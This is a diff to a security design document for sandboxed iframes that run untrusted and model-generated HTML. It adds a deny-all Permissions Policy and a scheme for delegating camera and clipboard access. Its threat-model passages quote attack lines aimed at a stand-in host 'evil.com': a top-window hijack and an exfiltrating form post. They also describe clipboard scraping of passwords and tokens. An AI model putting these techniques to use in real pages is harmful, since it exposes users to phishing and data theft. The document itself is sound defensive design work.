@@ -551,6 +551,10 @@ Least Privilege:
 - **Prototype Pollution & Deep JSON Defense:** Guarding host bridge services and backend parsers
   against prototype pollution keys (`__proto__`, `constructor`, `prototype`) and recursive stack
   overflow attacks from deeply nested structures (e.g., >10 levels) or oversized payloads (e.g., >64 KB).
+- **Permissions Policy Baseline & Capability Delegation:** Untrusted frames must be prevented from silently accessing
+  hardware sensors (camera, microphone, geolocation) or interacting with the system clipboard. Host wrappers enforce
+  an explicit deny-all Permissions Policy by default on sandboxed iframes, delegating capabilities only when explicitly
+  declared via `permissions` (Section 5.6).
 - **Top-Level Window Hijacking & Frame-Busting Defense:** Preventing untrusted or partner scripts
   from attempting `window.top.location = "https://evil.com"` to redirect or hijack the host window by
   strictly omitting `allow-top-navigation` and `allow-top-navigation-by-user-activation` across all
@@ -609,6 +613,11 @@ Sandbox to prevent CSRF and exfiltration.
   `WebAppFrameSrcdoc` could attempt to submit an HTML form (`<form action="https://evil.com/post" method="POST">`)
   to an external server. Because `connect-src 'none'` only blocks APIs like `fetch` and `XMLHttpRequest`,
   injecting `form-action 'none';` closes HTML form navigation and submission bypasses.
+- **Explicit Deny-All Permissions Policy:** To prevent untrusted markup from accessing sensitive hardware
+  sensors (camera, microphone, geolocation) or interacting with the system clipboard without host mediation,
+  the renderer must set an explicit deny-all Permissions Policy on the inner iframe element by default:
+  `allow="camera 'none'; microphone 'none'; geolocation 'none'; clipboard-read 'none'; clipboard-write 'none';"`.
+  As detailed in Section 5.6, capabilities needed by the embedded application are delegated dynamically when declared in `permissions`.
 - **Top-Level Window Hijacking Prevention:** The iframe sandbox configuration (`allow-scripts allow-forms allow-popups allow-modals`)
   strictly excludes `allow-top-navigation` and `allow-top-navigation-by-user-activation`. This blocks
   embedded scripts from redirecting the host window via `window.top.location` or anchor tags with `target="_top"`.
@@ -714,6 +723,37 @@ from applying this bypass to external or untrusted iframe URLs.
 - **Risk Assessment:** Likelihood: MED | Impact: HIGH | Relevant trust tiers: Tier 3 (Zero-trust untrusted) and Tier 2 (Semi-trusted partner).
 - **Security Concern:** Embedded third-party scripts or model-generated HTML may attempt top-level window hijacking (frame-busting) by setting `window.top.location = "https://evil.com"`, modifying `window.parent.location`, or executing link navigations targeting `_top`. This can redirect the host user away from the application to a phishing or malicious landing page.
 - **Mandatory Sandbox Directive Rules:** All iframe `sandbox` attributes configured by host renderers or intermediate sandbox proxies must strictly omit `allow-top-navigation`, `allow-top-navigation-by-user-activation`, and `allow-top-navigation-to-custom-protocols`. Omission of these tokens ensures modern browser security engines reject any attempt by embedded browsing contexts to navigate or manipulate top-level ancestor windows.
+
+## 5.6. Permissions Policy and Declarative Capability Delegation
+
+Because untrusted third-party code and model-generated HTML execute within sandboxed iframes, access to sensitive hardware sensors (camera, microphone, geolocation) and the system clipboard (`navigator.clipboard`) presents critical security and privacy considerations.
+
+### 5.6.1. Threat Model & Default Deny-All Baseline
+
+Even within a sandboxed iframe with an opaque `null` origin:
+
+- **Clipboard Scraping & Injection:** Malicious scripts could attempt to read passwords, auth tokens, or private user data via `navigator.clipboard.readText()`, or silently overwrite the clipboard.
+- **Hardware Probing & Fingerprinting:** Scripts could attempt to invoke `navigator.mediaDevices.getUserMedia()` or `navigator.geolocation.getCurrentPosition()`, triggering intrusive browser permission dialogs or fingerprinting devices.
+
+To establish a strict capability ceiling, the host wrapper/proxy injects an explicit **deny-all Permissions Policy** by default on the inner iframe element:
+
+```html
+<iframe
+  sandbox="allow-scripts allow-forms allow-popups allow-modals"
+  allow="camera 'none'; microphone 'none'; geolocation 'none'; clipboard-read 'none'; clipboard-write 'none';"
+  ...
+></iframe>
+```
+
+Under this default policy, native browser engine capabilities are physically disabled, preventing any unauthorized sensor prompts or ambient clipboard access.
+
+### 5.6.2. Declarative Capability Delegation (`permissions` parameter)
+
+When an embedded application requires legitimate access to capabilities (e.g., a barcode scanner requiring `camera`, or an interactive tool requiring `clipboard-write`):
+
+1. **Declared Permissions:** The component definition or initialization payload declares the required permissions array (e.g., `permissions: ["camera", "clipboard-write"]`).
+2. **Dynamic Allow Policy Construction:** The sandbox proxy constructs the `allow` attribute using standard delegation rules (via `buildAllowAttribute(permissions)`).
+3. **Optional Capability Activation:** If permissions are granted by the host/user, the `allow` attribute delegates capability access to the iframe (e.g., `allow="camera; clipboard-write;"`), allowing standard W3C Web APIs to operate with native browser user permission prompts. If permissions are omitted, empty, or unapproved, the proxy strictly enforces the explicit deny-all baseline (`camera 'none'; microphone 'none'; geolocation 'none'; clipboard-read 'none'; clipboard-write 'none';`).
 
 # 6. Implementation guidelines
 
